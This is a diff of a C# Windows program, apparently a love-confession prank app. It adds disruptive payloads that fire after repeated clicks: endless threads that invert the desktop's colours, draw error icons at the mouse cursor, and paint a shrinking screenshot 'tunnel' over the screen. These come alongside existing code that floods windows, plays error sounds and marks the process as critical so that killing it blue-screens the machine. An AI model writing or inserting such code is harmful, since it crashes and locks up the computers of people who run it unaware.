@@ -230,10 +230,24 @@ namespace I_love_you
             {
                 //点击50次以上就来点有意思的，蓝屏，弹窗
 
+                //不断打开form2，窗口雪崩
                 timer2.Start();
+
+                //播放系统报错音效
                 timer3.Start();
+
+                //弹幕攻击
                 Thread thread = new Thread(threadform);
                 thread.Start();
+
+                //运行反色
+                Thread thread2 = new Thread(threadfanse);
+                thread2.Start();
+
+                //在鼠标位置画叉
+                Thread thread3 = new Thread(threadicon);
+                thread3.Start();
+
                 button1.Visible = false;
                 button2.Visible = false;
 
@@ -246,9 +260,10 @@ namespace I_love_you
                 // setting the BreakOnTermination = 1 for the current process
                 NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
 
-                pictureBox1.Image = Properties.Resources.v2_122115abe696caf86a6d6ece227e31a6_hd;
-
                 //此时结束进程将会蓝屏
+
+                //修改图框的图片
+                pictureBox1.Image = Properties.Resources.v2_122115abe696caf86a6d6ece227e31a6_hd;
             }
         }
 
@@ -286,7 +301,12 @@ namespace I_love_you
             Form form = new Form2();
             form.Show();
 
-            
+            if(movetimes == 180)
+            {
+                //开始时空隧道
+                Thread thread = new Thread(threadlong);
+                thread.Start();
+            }
 
             if (movetimes == 250)
             {
@@ -308,5 +328,129 @@ namespace I_love_you
             //播放系统声音
             System.Media.SystemSounds.Beep.Play();
         }
+
+        [DllImport("user32.dll")]
+        public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
+        [DllImport("gdi32.dll")]
+        public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, int rop);
+
+        private void threadfanse()
+        {
+            //屏幕反色
+
+            while (true)
+            {
+                if(movetimes == 180)
+                {
+                    break;
+                }
+                // 获取桌面窗口句柄  
+                IntPtr desktop = GetDesktopWindow();
+                // 获取桌面窗口的设备上下文 DC  
+                IntPtr hdc = GetWindowDC(desktop);
+
+                //获取屏幕大小
+                Rectangle screenRect = Screen.PrimaryScreen.WorkingArea;
+
+
+                // 反转屏幕颜色  
+                BitBlt(hdc, 0, 0, screenRect.Right - screenRect.Left, screenRect.Bottom - screenRect.Top, hdc, 0, 0, 0x00330008);
+
+                // 释放设备上下文 DC  
+                ReleaseDC(desktop, hdc);
+
+                //暂停这个线程0.5秒
+                Thread.Sleep(500);
+            }
+
+        }
+
+        private void threadicon()
+        {
+
+         
+            //如果图片是bitmap类型的需要转换形式  bitmap to icon
+            Bitmap bitmap = new Bitmap(Properties.Resources.icons8_cancel_48);            
+            IntPtr iconHandle = bitmap.GetHicon();
+            Icon icon = Icon.FromHandle(iconHandle);
+
+            while (true)
+            {
+                //在鼠标位置画×
+
+                // 获取桌面窗口句柄  
+                var desktop = GetDesktopWindow();
+
+                // 获取桌面窗口的设备上下文 DC  
+                var hdc = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()));
+
+                // 获取光标位置
+                Point cursor = Control.MousePosition;
+
+                // 在光标位置处画错误图标
+                hdc.DrawIcon(icon, cursor.X - 10, cursor.Y - 10);
+            }
+        }
+
+        private void threadlong()
+        {
+            //时空隧道线程
+
+            // 初始化参数
+            double sleepTime = 1000; // 休眠时间，单位：毫秒
+            Screen screen = Screen.PrimaryScreen;
+            Size screenSize = screen.WorkingArea.Size;
+            Point startPoint = new Point(0, 0);
+
+            // 创建位图和绘图对象
+            Bitmap screenBitmap = new Bitmap(screenSize.Width, screenSize.Height);
+            Graphics screenGraphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()));
+            Graphics bitmapGraphics = Graphics.FromImage(screenBitmap);
+
+            do
+            {
+                try
+                {
+                    // 每次循环都将休眠时间减少，最小为1毫秒
+                    sleepTime -= 100;
+                    if (sleepTime <= 0)
+                    {
+                        sleepTime = 200;
+                    }
+
+                    // 将屏幕截图绘制到位图上
+                    bitmapGraphics.CopyFromScreen(startPoint, startPoint, screenSize);
+
+                    // 缩放位图并将其显示为图标
+                    int width = (int)(screenSize.Width * 0.9);
+                    int height = (int)(screenSize.Height * 0.9);
+                    int x = (int)(screenSize.Width * 0.05);
+                    int y = (int)(screenSize.Height * 0.05);
+                    IntPtr hIcon = screenBitmap.GetHicon();
+
+                    //将处理好的绘制到屏幕上
+                    screenGraphics.DrawIcon(Icon.FromHandle(hIcon), new Rectangle(x, y, width, height));
+
+                    // 休眠指定时间
+                    Thread.Sleep((int)sleepTime);
+
+                    // 释放资源并重新创建位图和绘图对象
+                    bitmapGraphics.Dispose();
+                    screenBitmap.Dispose();
+                    screenBitmap = new Bitmap(screenSize.Width, screenSize.Height);
+                    bitmapGraphics = Graphics.FromImage(screenBitmap);
+                }
+                catch
+                {
+                    // 出现异常时，释放资源并等待10秒后重新开始循环
+                    screenGraphics.Dispose();
+                    bitmapGraphics.Dispose();
+                    screenBitmap.Dispose();
+                    Thread.Sleep(1000);
+                }
+            } while (true);
+        }
+            
+        
     }
 }
